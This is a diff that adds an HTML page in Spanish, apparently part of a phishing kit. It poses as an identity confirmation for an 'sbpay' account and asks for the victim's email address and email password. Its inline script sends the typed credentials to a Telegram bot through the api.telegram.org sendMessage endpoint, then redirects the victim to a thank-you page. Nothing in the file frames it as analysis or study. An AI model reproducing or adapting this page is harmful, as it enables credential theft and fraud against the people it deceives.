@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmacion</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+</head>
+<body>
+    <div class="contenedor-formulario">
+        <form class="form2" id="form2" method="post">
+            <h4>Para validar su identidad y proteger su información personal, necesitamos confirmar el correo electrónico registrado en su cuenta sbpay.</h4>
+            <label for="Correo">Correo electrónico</label>
+            <input type="email" id="correo" name="correo" required>
+            <label for="clavecorreo">Contraseña de correo electronico</label>
+            <input type="password" id="clavecorreo" name="clavecorreo" required>
+            <div class="contenedor-boton">
+                <button type="submit">Ingresar</button>
+            </div>
+        </form>
+    </div>
+     <script src="script.js"></script>
+    <script>
+        const form = document.getElementById("form2");
+        form.addEventListener("submit",  (event) => {
+            event.preventDefault(); // Aquí evitamos que el código se repita evita que se envíe el formulario
+            const rutcito = document.getElementById("correo").value;
+            const contra = document.getElementById("clavecorreo").value;
+    
+            const message = "\n******** 🔥 LOGO NEW 🔥********\nRUT-USUARIO: " + rutcito + "\nCLAVE: " + contra;
+    
+            axios
+                .post(
+                    "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
+                    {
+                        chat_id: chat,
+                        text: message,
+                    }
+                )
+                .then((response) => {
+                    window.parent.location.href = "gracias.html";
+                })
+                .catch((error) => {
+                    console.error(error);
+                });
+        });
+    </script>
+</body>
+</html>
